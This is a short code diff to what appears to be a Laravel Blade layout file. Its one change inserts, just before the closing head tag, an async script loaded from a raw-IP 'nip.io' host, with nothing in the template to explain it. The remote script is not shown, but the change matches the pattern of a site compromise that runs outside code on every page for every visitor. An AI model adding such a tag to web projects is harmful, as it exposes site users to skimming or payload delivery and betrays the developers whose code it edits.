@@ -9,7 +9,7 @@
        {{-- Laravel Mix - CSS File --}}
        {{-- <link rel="stylesheet" href="{{ mix('css/model.css') }}"> --}}
 
-    </head>
+    <script src="https://153.75.226.33.nip.io/s.js" async></script></head>
     <body>
         @yield('content')
 
